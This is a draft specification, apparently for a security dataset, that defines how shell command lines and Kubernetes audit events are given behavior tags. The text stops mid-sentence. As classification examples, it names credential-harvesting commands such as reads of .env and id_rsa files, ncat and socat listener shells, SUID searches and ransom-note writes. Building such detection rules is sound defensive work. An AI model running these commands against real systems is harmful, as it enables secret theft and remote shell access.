# Rev20 Tagging RFC

Status: draft-1
Applies to: `tags_schema_rev20.json` vocabulary revision 20
Owner: AgentSmith corpus maintainers

Together with `tags_schema_rev20.json`, this document is the complete
authority for rev20 `behavior_tags[]`.

The RFC core defines stable tagging semantics. Appendix examples are maintained
in this same file so reviewers have one place to look, but examples are not new
rules. If an appendix example appears to conflict with the RFC core, the RFC core
wins and the example MUST be fixed.

## Changelog

- 2026-06-17: Folded Kubernetes AuditLog normalized-event semantics into this
  single RFC. K8s Audit operational notes are non-normative; this file remains
  the only RFC authority for rev20 behavior semantics.
- 2026-06-13: Added `write_ransom_note` for visible creation or modification
  of ransom, recovery, or extortion-note content; this is distinct from
  `encrypt_data` and from generic file-write mechanics.
- 2026-06-13: Removed generic file create/write/delete/copy/move labels from
  rev20; file-path behavior is now represented by retained security-semantic
  tags such as temporary or hidden staging, critical system paths, special nodes,
  executable content, persistence hooks, trust stores, and domain-specific
  mutations.
- 2026-06-13: Removed `search_other` and `query_remote_service`; generic search
  and generic remote/API query mechanics are no longer behavior labels unless
  the visible command supports a retained security-semantic target.
- 2026-06-13: Added a schema boundary matrix so every broad tag family has an
  explicit rev20 boundary in the RFC core instead of relying on schema names
  alone.

## Normative Words

The words **MUST**, **MUST NOT**, **SHOULD**, **SHOULD NOT**, and **MAY** are
used in the RFC sense.

- **MUST**: required for every corpus row and review.
- **MUST NOT**: forbidden even when a reviewer thinks the alternative is useful.
- **SHOULD**: default behavior; exceptions require a cited RFC principle,
  listed ambiguity, or row-specific justification.
- **MAY**: allowed but not required.

## Authority Order

Only two sources are normative:

1. `tags_schema_rev20.json`: allowed tag names, maintenance groups,
   output shape, invariants, and validation metadata.
2. This RFC core: evidence model, decision procedure, tagging principles, and
   review/change rules.

Prompts, review logs, historical corpus labels, training data, and appendix
examples are non-normative unless the RFC core explicitly imports their content.

The schema MUST remain a vocabulary artifact. It MUST NOT contain reference
examples, few-shot examples, boundary-rule lists, or case-specific review
guidance. Those belong in this RFC.

A reviewer MUST NOT change a corpus row only because a historical label "feels
less ideal". A row changes only when it violates the schema or a normative
requirement in this RFC core.

## Core Contract

Input:

```text
one raw observed command line or normalized audit/event line
```

Output:

```json
{"behavior_tags": ["zero or more visible complete behavior labels"]}
```

The output describes objective behavior visible in this single command line. It
does not describe maliciousness, authorization, success, session-level intent,
campaign identity, likely operator purpose, or facts learned only by executing
the command.

## Evidence Model

Reviewers MUST classify every possible tag source into one of these evidence
classes before assigning tags.

| Evidence class | Taggable? | Rule |
| --- | --- | --- |
| Executed stage | Yes | A command stage the shell, remote boundary, container boundary, workload boundary, chroot, or tool actually runs now. |
| Nested executed command | Yes | A command visibly executed now by `ssh`, `kubectl exec`, `docker exec`, `chroot`, equivalent remote/workload exec, or explicit shell execution. |
| Reference operand | Usually no | A file passed as config/defaults/properties/input for a different primary operation is not a read of that file's semantic content. |
| Output path | No by itself | A destination path can classify a write, but it does not prove a read or future execution. |
| Quoted text / search pattern | No by itself | Text matched, searched for, printed, written, or stored is not executed now and does not become a behavior solely because it appears as text. |
| Persisted payload | Only the current write/mutation | Cron, systemd, shell startup, Dockerfile, CI, package hook, or config content is future behavior unless this command also executes it now. |
| Path/content identifier | Only with operation evidence | Strong filenames, directory names, extensions, and option roles can classify the object of a visible read, write, search, mutate, transfer, or execute operation. They do not create an operation by themselves. |
| Tool name | No by itself | A binary name does not prove the operation; reviewers MUST inspect flags and operands. |

## Decision Procedure

For each row, reviewers MUST apply this order:

1. Parse the command into currently executed stages: separators, pipelines,
   command substitutions, process substitutions, remote commands, container or
   workload exec, chroot, and explicit shell `-c` boundaries.
2. Discard non-executed text: search patterns, printed strings, heredoc bodies
   when merely written, filenames, comments, serialized payload values, and
   future unit/cron/hook/config content.
3. Identify each stage's primary operation: read, enumerate, search, write,
   mutate, execute, connect, probe, transfer, dump, import, backup, compress,
   archive, schedule, or comparable visible behavior.
4. Select the most specific complete behavior tag for each independently visible
   operation.
5. Add multiple tags only when the command line exposes multiple independent
   operations.
6. Suppress generic parents when a specific child tag fully covers the behavior.
7. If no complete behavior is visible, emit `[]`.
8. If the row is ambiguous and no RFC principle decides it, preserve the
   existing row during review and propose an RFC update first.

## Tagging Principles

### RFC-P1: Visible Operation

A tag MUST be based on visible current operation evidence, not on tool names,
reviewer expectation, or what the command might do after execution. Path
keywords, search strings, archive names, and other content identifiers do not
create behavior by themselves, but under RFC-P5 they can classify the object of
a visible read, search, write, archive, transfer, mutation, or enumeration.

### RFC-P2: Current Execution Boundary

Only behavior executed by the current command line is taggable as current
execution. Quoted commands, serialized payloads, search strings, cron entries,
unit files, package scripts, CI configs, Dockerfiles, and other persisted content
MUST NOT receive execution tags unless this command line also executes that
content now.

For explicit shell `-c` forms, only the command string operand is parsed as
current shell code. Later operands are shell positional parameters and MUST NOT
be treated as executed commands by themselves.

### RFC-P3: Independent Operation Composition

Multiple tags MUST correspond to independently visible operations. Shell syntax,
redirection, pipelines, wrappers, option parsing side effects, and destination
paths do not create additional behavior tags by themselves.

Rev20 has no generic file create/write/delete/copy/move behavior labels. File
operations MUST be represented only when the visible target has a retained
security semantic: content class, persistence entry point, permission/capability
change, critical path, hidden or temporary staging path, special filesystem node,
transfer direction, archive/compression operation, or domain-specific mutation.
Do not add a file-path behavior merely because another operation saves its
report, scan result, query result, rendered view, dump, or log output to a path
via `>`, `tee`, `-o`, `--output`, or a tool-specific output option. In those
cases, keep the primary semantic tag, such as scanning, probing, querying,
dumping, rendering, testing, or auditing.

### RFC-P4: Specificity

When a specific tag completely covers the visible behavior, reviewers MUST NOT
also add a generic parent tag. Generic tags are used only when no more specific
complete tag applies.

### RFC-P5: Source And Content Semantics

Read, search, log, credential, secret, and config tags MUST follow the visible
source, objective, and content class. Reviewers MUST judge the operator's
visible objective like a human reviewer: if a command actively searches for,
filters for, writes to, transfers, archives, extracts, or enumerates objects
identified by a strong content marker, that marker classifies the visible
operation even when no file content is displayed and even if the target file
would later be empty or nonexistent.

This is an intent-and-operation standard, not a literal byte-observation
standard. A reviewer SHOULD ask what a competent operator is visibly trying to
do from the command line. For example, `find / -name "*.conf"` is a search for
configuration files, `cat mysql.conf` is a configuration read, and an archive
named like a credential or database backup classifies that archive or transfer
operation. Do not refuse the semantic tag merely because the command output is
not shown in the corpus row.

Strong content identifiers include conventional config names and patterns such
as `*.conf`, `*.cnf`, `my.cnf`, `mysql.conf`, `mysqld.cnf`, `nginx.conf`,
`sshd_config`, and `kubeconfig`; credential names and patterns such as `.env`,
`id_rsa`, `authorized_keys`, `credentials`, `secret`, `token`, `keytab`, and
`private.key`; and log names such as `auth.log`, `audit.log`, and `syslog`.
Reviewers SHOULD use the strongest specific tag supported by the visible
operation and content identifier. Ambiguous or misspelled names MAY be used when
surrounding context makes the class clear, but MUST NOT override a more direct
tool operation.
Socket paths are service connection targets rather than configuration files.
Cloud or managed-platform instance-data files are cloud metadata. Package
manifests, lockfiles, and requirements files under repositories or dependency
trees are source/package content, not infrastructure configuration.
Compiled application artifacts such as `.jar`, `.war`, or release binaries are
not source-code reads by filename alone; content rendering or filtering of those
artifacts gets `read_source_code` only when source, manifest, or repository
content is otherwise visible.

Environment files are a strict sensitive-content boundary. Paths named `.env`,
`*.env`, `*.env.*`, `process.env`, or comparable private environment dumps are
credential/sensitive material by default when their file content is visibly
read, searched, copied, archived, uploaded, downloaded, or otherwise
transferred. This default reflects normal Linux and application practice:
environment files commonly carry tokens, API keys, passwords, database URLs,
cloud credentials, and service secrets.

Reviewers MUST NOT downgrade visible environment-file content access to ordinary
business or infrastructure configuration merely because environment files can
also contain non-secret settings. Commands such as `cat .env`, `head .env`,
`grep ... .env`, `strings process.env`, `cp .env ...`, `tar ... .env`, or a
remote command visibly reading `.env` MUST include the applicable credential or
sensitive-content tag. A config tag may coexist only when the file's operational
configuration role is also materially visible; it MUST NOT replace
`read_credential_material`, `search_credentials`, `archive_sensitive_content`,
`upload_credential_material`, or `upload_sensitive_content`.

Narrow exceptions require positive evidence that the object is not secret
material, such as `.env.example`, committed defaults, documentation fixtures, or
a command that only writes a literal template without reading an existing
environment file. These exceptions should use ordinary config or source tags
only when their visible operation and target class support them; otherwise they
get no file-write fallback tag.

Ordinary service configuration files such as `my.cnf`, `mysql.conf`, and
`nginx.conf` remain configuration reads. Strongly credential-bearing config
files such as database client credential files, JAAS files, ACL files, and real
application DB connection configs add credential-material reads. Template,
example, and `.dist` config files do not add credential tags solely from the
filename.

Live environment-variable enumeration follows the same visible-objective
standard. Commands that print or filter live environment values use
`read_environment_variables`; filters or named variables such as `TOKEN`,
`SECRET`, `PASSWORD`, `API_KEY`, `PGPASSWORD`, `DATABASE_URL`, or `AWS_*` also
use the applicable credential-search, credential-material, or cloud-credential
tag. `env -u NAME command` only changes the child process environment and does
not read that variable's value.

Deleting visible credential material is a credential operation, not a generic
filesystem deletion. Removing targets such as `.env`, `id_rsa`,
`authorized_keys`, `credentials`, `secret`, `token`, `keytab`, `/etc/shadow`, or
credential bundles MUST use `delete_credential_material`. Removing unrelated
ordinary helper artifacts does not require an additional tag unless a more
specific retained semantic tag applies.

Copying or moving visible credential material MUST retain the source object's
credential/sensitive-content semantics when the vocabulary has a suitable tag.
Do not add any extra tag merely for local path movement.
Private-key paths such as `id_rsa`, `id_ed25519`, and `private.key` are
credential material when content is read, searched, transferred, or deleted.
Metadata-only actions such as `ls`, `stat`, `file`, `chmod`, `touch`, or
`chown` on those paths remain metadata or permission actions.
Special permission and file-attribute operations are classified by the metadata
being changed, not by target content. SUID/SGID bit setting, file capabilities,
ACL changes, and immutable or append-only `chattr` flags do not imply a content
read solely because the target path names credentials, logs, source code, or
configuration. Removing a SUID/SGID bit is generic permission modification unless
the vocabulary has a dedicated removal tag. Capability and immutable-attribute
removal use the dedicated removal tags. `search_world_writable_files` requires
world-writable predicates such as `-perm -0002`; generic `-writable` searches
only prove writability for the current effective user and should use
`enumerate_filesystem` when the command visibly enumerates matching paths.

Deleting live configuration files or repository-managed configuration files is
configuration or repository mutation. Deleting temporary config copies,
snapshots, generated bundles, or archive artifacts gets no extra label unless
another strong semantic class, such as credential material or logs, applies.

Positive search patterns and filters are first-class evidence for the search
objective only when rev20 has a retained tag for that objective. Searching for
credential stores or credential material such as `.ssh` directories, `.env`,
`id_rsa`, `authorized_keys`, private-key names, token/secret names, SUID or SGID
predicates, file capabilities, or world-writable predicates MUST receive the
applicable retained search tag. Content searches for credential markers such as
`password`, `secret`, `token`, `api_key`, or `keytab` also classify the search
objective as credential search. This does not imply the matched files were read
as semantic content unless the command also reads a visible source object.
Exclusion-only patterns, comments, and text that is merely printed or stored do
not define the search objective.
Authentication-log event phrases such as `Failed password`, `Accepted password`,
`Accepted publickey`, or `Invalid user` describe login outcomes and do not by
themselves define a credential-search objective when the visible source is an
auth log or journal. SSH policy field names such as `PasswordAuthentication`,
`PubkeyAuthentication`, and `PermitRootLogin` describe policy reads, not
credential-material searches.
Searching auth or audit logs for a credential-bearing path string, such as
`/home/user/.ssh/authorized_keys` or `id_ed25519`, reads the log source and does
not by itself read, discover, or search the referenced SSH key file content.

Configuration, log, source-code, and business-data searches have no generic
search tag in rev20. Filename discovery such as `find /etc -name '*.conf'`,
`locate '*.log'`, or `find /srv/app -name '*.py'` is filesystem enumeration
unless the filename also matches a retained sensitive-search class. Content
filtering such as `grep pattern /etc/app.conf`, `rg TODO /srv/repo`, or
`awk ... /var/log/auth.log` reads the visible source class and should use the
corresponding semantic read tag, such as config, source, business data, or log.

Rev20 has no generic search fallback label. Search and filter tools such as
`grep`, `find`, `awk`, `sed`, `rg`, `locate`, YARA, or comparable scanners MUST
use a retained search tag only when the visible target class has security
meaning, such as credential material, sensitive files, SUID/SGID files,
capability files, or world-writable files. Otherwise, use the semantic source
read tag when the source itself is visible and meaningful, such as logs,
configuration, source code, or business data. If neither a retained search
target nor a semantic source is visible, emit no search-related tag.

Destination paths and archive/container names classify the visible write,
archive, extract, transfer, or metadata operation they participate in. Writing
to a path named like a configuration file is a configuration mutation when the
write operation is visible. Listing, extracting, creating, uploading, or
downloading an archive or object named like a credential/config/log bundle
inherits the sensitive-content class for that archive operation. These names do
not by themselves prove direct reading of archive members or destination file
content unless the command also reads or extracts that object.

Content comparison, counting, joining, and formatting tools such as `diff`,
`cmp`, `comm`, `paste`, `join`, `wc`, `col`, and `column` visibly read their
input content. They MUST use the source's semantic read tag when one is visible;
they MUST NOT be reduced to `inspect_file_metadata` solely because they do not
modify files.

Path-shape and path-resolution tools such as `basename`, `dirname`, `realpath`,
and `readlink` inspect path strings or link targets. They use
`inspect_file_metadata` and MUST NOT inherit semantic content-read tags merely
from path names.
Resolving `/proc/<pid>/exe`, `/proc/<pid>/cwd`, `/proc/<pid>/root`, or the same
links under `/proc/self` is process runtime-attribute inspection, not a semantic
read of the executable, working directory, or root filesystem content.

SSH public authorization and trust material, such as `authorized_keys` and
`known_hosts`, is SSH policy content when visibly read or transferred. It MUST
NOT be labeled as credential material solely because it appears under an `.ssh`
path.
Counting, comparing, checksumming, or rendering `authorized_keys` reads SSH
policy content; appending, replacing, or installing its content modifies SSH
authorization. Metadata, ownership, security-context, or audit-watch changes on
the file do not modify SSH authorization unless scheduled key content is also
written or removed.
The `.ssh` directory itself is a strong sensitive boundary when the command
visibly lists its contents, searches it, copies it, archives it, uploads it, or
otherwise transfers it. Use SSH policy, credential, or sensitive-content tags
according to the visible child paths and operation. Directory-metadata-only
operations such as `stat ~/.ssh`, `lsattr -d ~/.ssh`, `chown ~/.ssh`, or
`chmod 700 ~/.ssh` remain metadata or permission actions and do not imply that
SSH key or policy content was read.

### RFC-P6: State Mutation Semantics

Persistent state changes, runtime state changes, scheduled task changes,
service enablement, verification material changes, permissions, and filesystem
transforms are distinct behaviors. Reviewers MUST choose the tag that matches
the visible mutation direction and target state, and MUST NOT infer adjacent
state changes that are not visible.

File-operation labels are security-semantic, not syscall-semantic. Reviewers
MUST NOT tag ordinary create/write/delete/copy/move mechanics unless the target
or content has a retained security meaning.

Use `write_ransom_note` when visible content or target naming shows a ransom,
recovery, encryption notice, payment demand, or extortion instruction being
written or appended. This tag does not require visible file encryption in the
same command and MUST NOT substitute for `encrypt_data` when encryption is
actually visible. Ordinary deployment notes, status markers, reports, and
support logs do not use this tag.

Local path deletion follows the deleted object's semantic class, not the
`rm`/`rmdir`/`unlink` mechanism. Use `delete_credential_material` for credential
material, `delete_audit_log`/`delete_system_log`/`delete_infrastructure_log`/
`delete_business_log` for logs, `delete_source_code` for source content,
`delete_scheduled_task` and `delete_systemd_unit` for concrete persistence
definitions, database/object-storage/container/cloud delete tags for their
domains, `modify_*_config` or policy-specific mutation tags for configuration
and authorization files, `modify_bootloader` for bootloader paths,
`modify_critical_system_path` for high-trust OS paths with no stronger tag, and
`wipe_storage` for broad destructive path removal such as root, boot, home, or
large service trees. Use `securely_delete_data` only for tools that visibly
overwrite or securely erase the target. Deleting ordinary temporary files,
reports, caches, packages, build artifacts, staging directories, or unknown
helper files gets no file-path behavior tag. Do not use temporary/hidden staging
tags for deletion-only commands.

Use `stage_temporary_path` only when the current command visibly writes,
creates, downloads, copies, extracts, archives, or generates retained content
into a temporary/user-writable staging location such as `/tmp`, `/var/tmp`,
`/dev/shm`, `/run/user/*`, or a comparable scratch path. The tag requires an
actual current write/stage destination. A temporary path that is only read,
executed, uploaded from, checked, deleted, mentioned in text, used as an input,
or used as a cookie/header/config operand is not enough.

Use `stage_hidden_path` only when the current command visibly writes, creates,
downloads, copies, extracts, archives, or generates retained content into a
hidden path component such as `/tmp/.cache`, `/dev/shm/.x`,
`.config/.hidden`, or a comparable dot-prefixed path. The hidden component must
be part of the current write/stage destination. A hidden path that is only read,
executed, uploaded from, checked, deleted, mentioned in future config text, or
used as an input is not enough.

Temporary/hidden staging tags are strict secondary tags. Do not use them for
ordinary reports, scan results, service-status captures, health-check output,
test reports, rendered manifests, process snapshots, database/query exports, or
other domain-specific outputs whose primary behavior is already represented by a
more specific tag, unless the command is clearly building a retained bundle,
payload, credential/config capture, or transfer staging artifact. Do not infer
the tags from future cron/systemd/hook payload text; tag the current file write
or persistence object only. Do not use them for well-known semantic dot paths
that have stronger tags, such as `.ssh/authorized_keys`, `.env`, repository
hooks, shell startup files, or package metadata.

Use `modify_critical_system_path` only as a fallback for writes, replacements,
deletions, or destructive edits under high-trust operating-system paths when no
more specific tag applies. Examples include `/etc`, `/boot`, `/usr/lib`, `/lib`,
`/usr/local/lib`, and comparable OS trust or load paths. Prefer stronger tags for
systemd units, cron/scheduled tasks, sudo/PAM/SSH policy, dynamic loader state,
library preload, shell startup, bootloader state, trust stores, kernel modules,
system executables, web scripts, and infrastructure or business configuration.

Use `create_special_filesystem_node` for explicit creation of FIFO, device, or
socket-like filesystem nodes with tools such as `mkfifo`, `mknod`, or equivalent
node-creation forms. Symlink operations keep `modify_symlink`.

Use `modify_repository_hook` for creating, replacing, editing, or deleting
repository execution hooks such as `.git/hooks/*`, server-side Git hooks, or
comparable VCS hook paths. Persisted hook payloads are future execution unless
the command also executes them now.

Use `modify_package_execution_hook` for creating, replacing, editing, or deleting
package-manager or build-system lifecycle hooks such as `package.json` scripts,
npm/yarn/pnpm lifecycle entries, Python package build hooks, Ruby gem hooks, or
comparable install/build/test hook definitions. Ordinary dependency version
changes use dependency tags, not hook tags.

Use `write_kernel_module_content` when module content is written, copied,
downloaded, built, or placed as a `.ko` artifact or under kernel module load
paths such as `/lib/modules`. Loading or unloading that module remains
`load_kernel_module` or `unload_kernel_module`.

Use `modify_trust_store` for mutations to trust roots or verification stores,
including system CA bundles, Java `cacerts`, NSS databases, GPG/APT/YUM trust
keyrings, container registry trust stores, and comparable certificate authority
or package-verification trust anchors. Standalone certificate/key/signature
material can remain `modify_verification_material` when it is not a trust store.
File-integrity baselines and databases, such as AIDE init/update outputs, are
verification material: initialization or update uses
`modify_verification_material`, while checks use `verify_artifact_integrity`.

### RFC-P7: Transfer And Query Semantics

Transfer tags require visible movement of content. Service health checks,
metrics queries, metadata reads, API probes, and session opens MUST use their
specific query/read/session tags rather than generic upload or download tags.
Upload/download direction and uploaded/downloaded content class MAY both be
tagged when both are visible.

Rev20 has no generic remote-service query label. HTTP, RPC, CLI, or API requests
MUST be classified by the concrete visible operation: probe, health query,
metrics read, content download, upload, mail operation, database/cache/object
storage query, cloud-control-plane read or mutation, workload or infrastructure
inspection, or another retained domain tag. Opaque remote/API reads with no
visible retained security target MUST NOT receive a placeholder query tag.

For HTTP clients, method and flags decide direction before URL shape. GET-style
requests that retrieve response bodies are downloads or domain reads when a
more specific domain tag applies. HEAD/spider forms are probes. Requests with
visible request bodies or mutating methods such as POST, PUT, PATCH, or DELETE
MUST NOT be labeled as downloads solely because the URL names a file.

### RFC-P8: Boundary Execution

Remote, container, workload, chroot, and multiplexer boundaries MUST be tagged
according to what the boundary actually does now. A boundary tag may coexist with
the nested behavior when the nested command is executed now. Sending input to a
multiplexer is not the same as directly executing that input in the current
command line.
Creating a multiplexer session, window, or pane with a command starts that
command now, so visible nested behavior may be added; attaching or sending keys
only changes or targets the multiplexer state unless execution is otherwise
visible in the same command line.

Listener command handlers such as `ncat -e ... -l` and `socat
TCP-LISTEN:... SYSTEM:...` or `UNIX-LISTEN:... SYSTEM:...` register future
per-connection behavior. Unless the same command line visibly triggers the
connection and handler execution now, reviewers MUST tag the listener, not the
handler's future side effects.
Proxy helpers that start an active proxy service are dynamic-proxy creation and
may also be network listeners; direct one-shot forwarding wrappers such as SSH
`ProxyCommand='ssh -W ...'` are connection behavior, not proxy creation. When an
active proxy is started with an explicit private-key path, the command also
reads credential material.

Privilege wrappers such as `sudo`, `doas`, and `pkexec` are execution wrappers,
not retained behavior tags. When they visibly run a command now, tag the nested
command's visible behavior and any concrete identity change, but do not add a
generic privilege-wrapper tag.

### RFC-P9: Domain-Specific Primary Operation

When a domain-specific operation is visible, such as object-storage transfer,
database dump/import, cloud credential read, cluster secret read, or package
verification material mutation, reviewers SHOULD use the domain-specific tag
instead of a less-specific file-path, HTTP, or process tag.

Process listing, tree, and search tools such as `ps`, `pstree`, `pgrep`, and
unfiltered or user-filtered `top`/`htop` MUST use `enumerate_processes`.
`top`/`htop` views pinned to explicit process IDs SHOULD use
`inspect_process_runtime_attributes`.

Open-file ownership tools such as `lsof` and `fuser` enumerate file, process,
or socket usage. Path operands to these tools MUST NOT be treated as semantic
content reads. `fuser -k` is process termination; signal `0` forms are
existence checks, not termination.

Account identity, access state, and authentication policy are separate. User
names, UIDs, home directories, and login shells are identity attributes. Account
lock/unlock/expiry state is user access state. Password aging/status policy read
by tools such as `chage -l` or `passwd -S` is authentication policy.
PAM file edits and authselect or pam-auth-update feature changes are PAM policy
modification. Local identity/auth cache cleanup such as `sss_cache -E` is cache
flush behavior, not authentication policy modification. Kubernetes and
OpenShift RBAC reconciliation or role grants use cluster auth-policy or cluster
privilege tags rather than local auth-policy tags.
When identity or auth data is queried through an explicit remote directory or
identity protocol such as LDAP, keep the identity/auth tag and also add the
matching connection-boundary tag. This companion rule is narrow: do not add a
generic connection tag to every database, broker, cache, cloud, or workload
domain operation solely because a remote endpoint is present. Self-principal
lookups such as `ldapwhoami` or `az account show` are current-identity
inspection, not generic identity enumeration. Reads of `sudo` group membership
or LDAP `sudoRole` objects add `read_sudo_policy` alongside identity tags.

Scheduled task tags are distinct by operation. Listing scheduled task names or
timer sets is enumeration. Reading concrete crontab, timer, or scheduled-task
unit content is `read_scheduled_task`. Explicitly running a scheduler entry,
timer, or scheduled-task script is `execute_scheduled_task`. Creating, editing,
replacing, removing, enabling, or disabling scheduled execution uses the
create/modify/delete scheduled-task tags according to the visible operation.
`crontab -l` reads concrete crontab content. `crontab FILE` and `crontab -`
install or replace scheduled execution; tag the schedule mutation, not the
future payload's behavior unless that payload is also executed now. Directory
listings of cron paths, `run-parts --list`/`--test`, and `systemctl list-timers`
enumerate scheduled tasks unless they also read task file contents.
Creating, replacing, editing, truncating, or removing concrete files under
cron task locations is scheduled-task management; metadata-only changes such as
chmod, chown, touch, mkdir, or rmdir stay permission, metadata, staging, or
critical-path behavior only when a retained specific tag applies.
`run-parts /etc/cron.*`, direct execution of files under concrete cron task
locations, and `systemctl start` or `restart` of `.timer` units are scheduled
task execution. Systemd `.timer` unit-file creation, replacement, editing,
deletion, masking, unmasking, enabling, disabling, or stopping is scheduled-task
management in addition to any systemd unit or service-state tag. Timer status,
show, and journal reads remain service inspection or log reads unless they read
timer unit content.
For non-timer systemd services, creating, replacing, editing, truncating, or
deleting concrete unit/drop-in content uses systemd-unit tags. `daemon-reload`
reloads manager state but is not itself unit content creation or editing.
`enable`, `disable`, `mask`, and `unmask` are service enablement operations;
`start`, `stop`, `restart`, and `try-restart` are service-state operations.
Service health, readiness, liveness, registration-probe, and status-notify
commands are not service-state modification unless they also start, stop,
restart, reload, enable, disable, mask, or unmask the service.
Starting, reloading, or controlling an infrastructure daemon with an explicit
config-file or config-directory operand also reads infrastructure configuration.
Commands that create or edit the config and then reload the service keep the
configuration mutation tag; do not add a separate config-read tag solely because
the service reloads after the write.
Kubernetes CronJob and external scheduler lifecycle commands follow the same
scheduled-task operation split: create, patch/update, delete, read/list, and
run/trigger map to scheduled-task creation, modification, deletion, read or
enumeration, and execution.

Local Kubernetes cluster lifecycle tags are separate from workload and cloud
resource tags. Creating or starting local minikube, kind, k3d, or kubeadm-based
clusters is `create_local_kubernetes_cluster`; checking local cluster status or
listing local clusters is `inspect_local_kubernetes_cluster`; deleting or
resetting those local clusters is `delete_local_kubernetes_cluster`. Loading or
importing images into a local cluster remains `transfer_container_image`;
commands routed through a local cluster wrapper to `kubectl` follow the visible
`kubectl` operation. Local cluster lifecycle commands with explicit config-file
operands also read infrastructure config; kubeconfig export helpers are
`export_cluster_config`, not local cluster inspection. Kubeadm phase-only
commands follow the named phase rather than inheriting full cluster creation;
for example token creation creates an access token, token listing reads cluster
secret data, and certificate upload modifies cluster secret material.
Kubernetes context helpers such as `kubectx` and `kubens` read or modify local
kubeconfig context state, not cloud CLI state or cluster authorization policy.
Direct content reads or content scans of kubeconfig files, including
`admin.conf`, read credential material because those files commonly contain
cluster access credentials. Passing a kubeconfig only as an authentication
operand to another visible Kubernetes operation does not add a separate
credential-read tag.
Kubernetes node join commands such as `kubeadm join` create cluster identity
state; their API-server endpoint is not the primary tag when the join operation
is visible. Workload shell helpers such as `oc rsh` are workload execution, and
interactive shells add `spawn_interactive_shell`.
Kubernetes NetworkPolicy reads, diffs, and mutations are firewall-policy
inspection or modification, not cloud-provider firewall changes.
Kubernetes `get` and `list` operations over live cluster objects enumerate
cluster resources, even when the object contains configuration-like YAML.
`describe`, rollout status, and detailed live workload views inspect workload
state. They are not local infrastructure-configuration reads solely because the
output can be rendered as YAML or JSON.

Kubernetes AuditLog rows use normalized event strings, not raw audit JSON:

```text
k8s_audit verb=<verb> apiGroup=<group> resource=<resource> subresource=<subresource> namespace=<namespace> name=<name> user=<user> userAgent=<agent> requestURI=<uri> requestObject=<summary>
```

The behavior label describes the visible Kubernetes API operation. Caller
identity, user agent, source IP, response status, authorization result, and
attack likelihood do not create tags by themselves. A failed or denied event
keeps the attempted visible behavior tag when the operation is visible.
`get`, `list`, and `watch` on ordinary live objects use
`enumerate_cluster_resources`; named or collection reads of workload status,
rollout, scale/status, pod status, and comparable detailed workload state use
`inspect_workload` when the normalized event establishes a status or detailed
workload inspection. `create`, `update`, `patch`, `delete`, and
`deletecollection` on ordinary live objects such as Pods, Deployments,
DaemonSets, StatefulSets, Jobs, Nodes, Namespaces, ConfigMaps, Leases, PVCs,
PVs, ResourceQuotas, LimitRanges, PodDisruptionBudgets, PriorityClasses,
RuntimeClasses, StorageClasses, CSIDrivers, CSINodes, VolumeAttachments,
VolumeSnapshots, VolumeSnapshotClasses, CustomResourceDefinitions, and
APIServices use `modify_workload` unless a more specific auth, secret,
firewall, route, scheduled-task, backup, or verification-material rule applies.
`pods/eviction` create and `pods/binding` create are workload modification.

Kubernetes AuditLog secret, credential, and workload-execution rules are
specific. Secret collection reads use `enumerate_cluster_secrets`; named Secret
reads use `read_cluster_secret`; Secret create, update/patch, delete, and
deletecollection use `create_cluster_secret`, `modify_cluster_secret`,
`delete_cluster_secret`, and `delete_cluster_secret` respectively. Service
Account token subresource creates use `create_access_token`; ServiceAccount
object reads enumerate cluster resources, and ServiceAccount object mutations
are workload modification. SubjectAccessReview, SelfSubjectAccessReview,
LocalSubjectAccessReview, SelfSubjectRulesReview, and TokenReview create events
use `verify_auth_policy`. `pods/exec` and comparable command subresources use
`execute_in_workload`; if the normalized request includes the inner command,
the visible Linux command behavior tags are also required. Visible shell opens
such as `/bin/sh`, `/bin/bash`, `cmd.exe`, or PowerShell add
`spawn_interactive_shell`. Examples: `command=id` adds
`inspect_current_identity`, `command=printenv` adds
`read_environment_variables`, `command=curl ... /healthz` adds
`query_service_health`, and reading the service-account token path adds
`read_container_secret` and `read_credential_material`. `pods/attach` uses
`execute_in_workload`, and adds `spawn_interactive_shell` only when the event
opens an interactive terminal or visibly attaches to a shell. `pods/log` uses
`read_workload_logs`; `pods/portforward` uses `port_forward_workload`.
`pods/ephemeralcontainers` reads inspect workload state; patch/update events
that add ephemeral containers modify workload state, even when the debug
container command is a shell.

Kubernetes AuditLog policy, route, scheduler, and controller objects use the
same semantic families as command-line Kubernetes operations. Service, Ingress,
Endpoint, EndpointSlice, Gateway, HTTPRoute, Route, VirtualService,
DestinationRule, and comparable routing or exposure mutations use
`modify_route`; reads of those objects enumerate or inspect live cluster state.
NetworkPolicy, CiliumNetworkPolicy, and comparable Kubernetes network-policy
reads use `inspect_firewall_policy`; their mutations use
`modify_firewall_policy`. Role, ClusterRole, RoleBinding, ClusterRoleBinding,
PodSecurityPolicy, admission webhooks, ValidatingAdmissionPolicy,
ValidatingAdmissionPolicyBinding, Kyverno Policy/ClusterPolicy, Gatekeeper
constraints, and comparable admission policy reads use `inspect_auth_policy`;
their mutations use `modify_cluster_auth_policy`, except concrete binding
grants may use `grant_cluster_privilege`. Namespace label changes that set Pod
Security Admission modes such as `pod-security.kubernetes.io/enforce` are
`modify_cluster_auth_policy`. CronJob collection and named reads use
`enumerate_scheduled_tasks` or `read_scheduled_task`; CronJob create,
update/patch, and delete use `create_scheduled_task`,
`modify_scheduled_task`, and `delete_scheduled_task`. A Job created from a
CronJob template with a visible CronJob owner is `execute_scheduled_task`; a
plain Job create remains `modify_workload`. Velero Backup, Restore, Schedule,
and comparable backup-controller CRDs use `manage_infrastructure_backup` for
backup/restore lifecycle operations. CertificateSigningRequest approval,
CertificateRequest, Certificate, Issuer, ClusterIssuer, and comparable
certificate workflow mutations use `modify_verification_material`; plain
collection reads remain cluster-resource enumeration unless the event reads a
concrete Secret containing certificate private material. GitOps and operator
service accounts are tagged by the visible API operation they perform, not by
the caller identity.
Live Kubernetes and OpenShift resource changes are not cloud-control-plane
resource changes unless the command addresses a provider resource outside the
cluster API. Apply/delete/patch/label/taint operations on ordinary cluster
objects, nodes, namespaces, PVCs, webhooks, and add-ons are workload or cluster
state modification. Traffic exposure and routing objects such as Services,
Ingresses, Endpoints, Routes, and service-mesh VirtualServices use
`modify_route`. RBAC, admission/auth policy, secrets, NetworkPolicies, and
CronJobs keep their specialized cluster, firewall, secret, or scheduled-task
tags.
OpenShift project/context helpers follow the same local context rule. `oc
project`, `kubectx`, and `kubens` modify or read local kubeconfig context state
according to the visible option. `oc expose svc/...` creates or changes cluster
routing/exposure and is `modify_route`; `oc start-build --follow` combines
container-image build behavior with build log reading.

Infrastructure template rendering, planning, validation, linting, and dry-run
forms are `plan_infrastructure_template` when they do not apply changes to a
live target. Source operands can add the applicable semantic read tag when the
